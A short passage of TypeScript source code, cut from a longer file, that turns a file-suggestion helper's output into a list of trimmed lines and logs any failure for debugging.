      storageV5 ?? getPinnedStorageV5(),
    )

    if (result.aborted || result.status !== 0) {
      return []
    }

    return result.stdout
      .split('\n')
      .map(line => line.trim())
      .filter(Boolean)
  } catch (error) {
    logForDebugging(`File suggestion helper failed: ${error}`, {
      level: 'error',
    })
    return []
  }
}
